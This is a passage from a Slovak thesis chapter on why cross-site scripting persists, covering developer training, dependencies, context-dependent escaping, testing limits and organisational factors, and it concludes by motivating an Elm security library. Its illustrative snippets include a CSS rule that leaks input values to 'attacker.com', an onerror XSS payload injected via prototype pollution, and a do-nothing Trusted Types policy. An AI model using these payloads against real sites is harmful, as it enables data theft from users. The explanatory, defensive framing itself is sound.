\subsection{Nedostatočné bezpečnostné vedomosti vývojárov}

Stack Overflow prieskum \parencite{stackoverflow2023survey}:
\begin{itemize}
  \item Iba 23\,\% vývojárov absolvovalo formálne bezpečnostné školenie
  \item 67\,\% vývojárov považuje bezpečnosť za „nie moju prácu"
  \item 41\,\% nevie vysvetliť rozdiel medzi validáciou a sanitizáciou
\end{itemize}

\textbf{Priemerný vývojár vie:}
\begin{lstlisting}[language=JavaScript, caption={Komentar v JavaScript kode}, label={lst:koment-r-v-javascript-k-de-54}]
// "Pouzi innerHTML, je to rychlejsie"
element.innerHTML = userData; // XSS!

// Namiesto bezpecneho:
element.textContent = userData;
\end{lstlisting}

\subsection{Tlak na rýchly delivery}

Typický vývojový proces:

\begin{lstlisting}[language=JavaScript, caption={Komentar v JavaScript kode}, label={lst:koment-r-v-javascript-k-de-55}]
// Sprint planovanie:
"Musime to dodat do piatku!" 
// → Bezpecnost: odlozena

// Code review:
"LGTM" (5-minutovy review)
// → XSS: nenajdene

// Testing:
"Vsetky unit testy prechadzaju"
// → Security tests: ziadne

// Deploy:
git push && deploy
// → Security scan: preskoceny (lebo je pomaly)
\end{lstlisting}

\subsection{Závislosti tretích strán}

Moderné aplikácie závisia od stoviek npm balíkov \parencite{snyk2023vulnerabilities}:

\begin{lstlisting}[language=JavaScript, caption={Komentar v JavaScript kode}, label={lst:koment-r-v-javascript-k-de-56}]
// Typicky strom zavislosti package.json
zavislosti: 287 balikov
├─ priame: 23
└─ tranzitivne: 264

// Kolko z tychto 287 ste osobne skontrolovali?
\end{lstlisting}

Štúdia Snyk (2023): 77\,\% známych zraniteľností prichádza z tranzitívnych závislostí \parencite{snyk2023vulnerabilities}.

\subsection{Zložitosť prepínania kontextov}

Vývojár musí neustále prepínať medzi kontextmi \parencite{samuel2011context}:

\begin{lstlisting}[language=HTML, caption={HTML s injektovanym skriptom}, label={lst:html-s-injektovan-m-skriptom-57}]
<!-- Sablona kde kazdy zastupny symbol ma ine pravidla -->
<div>
  <!-- HTML kontext: znefunkcnit < > & " ' -->
  {znefunkcniHTML(pouzivatelVstup)}
  
  <a href="/search?q={kodujURL(pouzivatelVstup)}">
    <!-- URL kontext: url kodovanie -->
  </a>
  
  <script>
    // JavaScript kontext: JSON.stringify + znefunkcniJS
    var data = {znefunkcniJS(JSON.stringify(pouzivatelVstup))};
  </script>
  
  <style>
    /* CSS kontext: znefunkcniCSS */
    .user::after { content: "{znefunkcniCSS(pouzivatelVstup)}"; }
  </style>
</div>
\end{lstlisting}

Každý kontext vyžaduje iné ošetrenie. Pomýlenie kontextov je ľahké a častý zdroj chýb.

\subsection{Kompromisy medzi výkonom a bezpečnosťou}

Dôkladná dezinfekcia môže mať vplyv na výkon:

\begin{lstlisting}[language=JavaScript, caption={Funkcia na dezinfekciu vstupu}, label={lst:funkcia-na-dezinfekciu-vstupu-58}]
// Jednoducha, ale pomala dezinfekcia
function dezinfikuj(html) {
  const div = document.createElement('div');
  div.innerHTML = html;
  // Analyzovanie cez DOM je pomale
  return div.textContent;
}

// 1000 poloziek = 1000 DOM operacii = znacne oneskorenie
\end{lstlisting}

Vývojár často volí rýchlosť nad bezpečnosťou, najmä keď je termín blízko.

\subsection{Evolúcia útočných vektorov}

Útočníci neustále nachádzajú nové vektory \parencite{lekies2015code}. Príklady z posledných rokov:

\textbf{2020: Exfiltrácia cez CSS:}
\begin{lstlisting}[language=HTML, caption={Priklad sablony}, label={lst:pr-klad-abl-ny-59}]
/* Unik dat cez CSS */
input[value^="a"] {
  background: url('https://attacker.com/leak?c=a');
}
\end{lstlisting}

\textbf{2021: XSS cez znečistenie prototypu:}
\begin{lstlisting}[language=HTML, caption={XSS cez event handlery}, label={lst:xss-cez-event-handlery-60}]
Object.prototype.html = '<img src=x onerror=alert(1)>';
// Potom niekde inde:
template.innerHTML = data.html; // Znecistenie prototypu
\end{lstlisting}

\textbf{2022: DOM XSS cez obídenie dôveryhodných typov:}
\begin{lstlisting}[language=HTML, caption={Priklad sablony}, label={lst:pr-klad-abl-ny-61}]
// Obidenie Doveryhodnych typov
trustedTypes.createPolicy('default', {
  createHTML: (s) => s // Ups, ziadna dezinfekcia
});
\end{lstlisting}

\subsection{Výzvy testovania}

Automatizované testovanie XSS má obmedzenia:

\begin{lstlisting}[language=JavaScript, caption={Funkcia na dezinfekciu vstupu}, label={lst:funkcia-na-dezinfekciu-vstupu-62}]
// Staticke analyzatory maju falosne pozitiva/negativa
const pouzivatelVstup = ziskajPouzivatelVstup();
const bezpecne = dezinfikuj(pouzivatelVstup);
element.innerHTML = bezpecne; // Je to bezpecne? Zavisi od dezinfikuj()

// Nastroje SAST nevedia, ci dezinfikuj() je efektivna
\end{lstlisting}

Dynamické testovanie (DAST) tiež zlyháva:
\begin{itemize}
  \item Testovanie čiernej skrinky nemá pokrytie kódu
  \item Stránky vyžadujúce poverenia sú často netestované
  \item Koncové body AJAX/WebSocket sú ťažko testovateľné
\end{itemize}

\subsection{Organizačné výzvy}

Bezpečnosť často nie je v popredí priorít. Prieskum Cybersecurity Insiders (2023) \parencite{cybersecurity2023priorities}:
\begin{itemize}
  \item 61\,\% organizácií nemá vyčlenený bezpečnostný tím
  \item 48\,\% robí bezpečnostné preskúmanie iba pred uvedením do prevádzky
  \item 73\,\% nemá automatizované bezpečnostné brány v CI/CD
  \item 54\,\% nemá bezpečnostné požiadavky v definícii hotového
\end{itemize}

\section{Záver}

Cross-Site Scripting predstavuje viacrozmerný problém, ktorý vyžaduje komplexný prístup k riešeniu. Napriek tomu, že základné princípy XSS sú známe už viac ako 20 rokov, zostáva jednou z najrozšírenejších zraniteľností webových aplikácií \parencite{owasp2021top10}.

Analýza ukázala niekoľko kľúčových zistení:

\textbf{1. Technická zložitosť:} XSS nie je jednotlivá zraniteľnosť, ale trieda zraniteľností s mnohými variantmi (reflected, stored, DOM-based, mutation) \parencite{hydara2015current}. Každý typ vyžaduje špecifické obranné mechanizmy.

\textbf{2. Evolúcia útočných techník:} Útočníci neustále vyvíjajú nové techniky obchádzania (kódovanie, polygloty, mutácie) \parencite{lekies2015code}, čo vyžaduje adaptívne obranné stratégie.

\textbf{3. Kontext záleží:} Efektívna obrana vyžaduje prístup závislý od kontextu \parencite{samuel2011context} -- to, čo je bezpečné v jednom kontexte (telo HTML) môže byť nebezpečné v inom (reťazec JavaScriptu).

\textbf{4. Viacvrstvová obrana:} Žiadna jednotlivá technika nie je dostatočná. Efektívna obrana kombinuje overovanie vstupov, kódovanie výstupov, CSP \parencite{weichselbaum2016csp}, súbory cookie Iba-HTTP \parencite{west2016samesite} a postupy bezpečného kódovania.

\textbf{5. Ekonomický vplyv:} XSS nie je iba technický problém, ale má vážne obchodné dôsledky s priemernými nákladmi \$4.24M na incident \parencite{ibm2023databreach}.

\textbf{6. Ľudský faktor:} Technické riešenia sú dôležité, ale vzdelávanie vývojárov a organizačná bezpečnostná kultúra sú rovnako kritické \parencite{stackoverflow2023survey}.

V kontexte jazyka Elm, ktorý je ústredným bodom tejto práce, tieto poznatky motivujú náš prístup k návrhu bezpečnostnej knižnice. Typový systém Elm a funkcionálna architektúra ponúkajú jedinečné príležitosti na riešenie mnohých z týchto výziev na úrovni času kompilácie, čo je téma nasledujúcich kapitol.

Pochopenie anatómie XSS útokov, existujúcich obranných mechanizmov a ich obmedzení poskytuje základ pre návrh riešenia, ktoré využíva silné stránky jazyka Elm pri eliminácii bežných XSS vektorov.